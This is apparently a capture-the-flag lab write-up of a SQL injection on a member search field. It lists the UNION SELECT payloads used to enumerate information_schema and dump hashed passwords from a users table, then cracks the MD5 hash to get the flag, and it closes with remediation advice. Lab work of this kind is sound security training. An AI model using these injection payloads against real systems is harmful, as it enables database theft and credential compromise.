# Finding 07 - SQL injection on member searching input field

## Exploitability
Very easy. Only 2 steps required : inject code in input field, then decrypt md5 using easy-to-find web tool.

## Risk level/type
OWASP top 10
- A02:2021 – Cryptographic Failures		using md5 encryption
- A03:2021 – Injection 					vulnerability to SQL injection

## Detailed description of the exploit
First check whether input field is protected against SQL injections by typing:
```1 or 1=1```
This yields 5 elements, seemingly from a SQL database. The last one being :

```
ID: 1 or 1 =1  
First name: Flag
Surname : GetThe
```
Ok, so that's already quite interesting!


Then, try more advanced SQL injection with the following two commands:
```1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables```
and
```1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns ```
The results are copied in database_table_schema and database_table_columns files.
At the bottom of each listing, there are fields that seem to be user-generated (the only few names not fully capitalized)
The names can be found in the database_listing.md file.

From this info, we try another SQL injection command :
``` and 1=1 UNION SELECT first_name, last_name from Member_Sql_Injection.users```
which yields the same result as the basic SQL injection try.


From this info, we try another SQL injection command :
```1 and 1=1 UNION SELECT user_id, countersign from Member_Sql_Injection.users```
which yields :
```
ID: 1 and 1=1 UNION SELECT user_id, countersign from Member_Sql_Injection.users 
Title: 5ff9d0165b4f92b14994e5c685cdce28
Url : 5
```

And one last SQL injection command :
```1 and 1=1 UNION SELECT planet, Commentaire from Member_Sql_Injection.users```
which yields :
```
ID: 1 and 1=1 UNION SELECT planet, Commentaire from Member_Sql_Injection.users 
Title: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Url : 42
```

The countersign is probably hashed with md5, as this is the previously encountered hashing algorithm.
Let's verify it with the following website:
https://www.md5online.org/md5-decrypt.html

It works ! And yields the following :
FortyTwo
As lowercase, it becomes:
fortytwo
To encrypt it with sha256, we can use the command:
```echo -n "fortytwo" | sha256sum```
The flag is:
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

## Remediation

Input sanitizing is the first step.
There are several ways to sanitize the input, depending on the code architecture (legacy).
The first step is to use prepared statements with parameterized queries
	-> this means that the query would not be evaluated as a command but as a string, looking for an exact match to the string (i.e. a username matching "1 or 1 = 1")
For legacy code, you can also escape all the user input before putting it in a query.

Also, md5 is now deprecated in favor of sha2 algorithms (sha256, sha512) as well as sha3 algorithms.

## Additional resources
https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html

md5 deprecation notice :
https://www.security-database.com/detail.php?alert=VU836068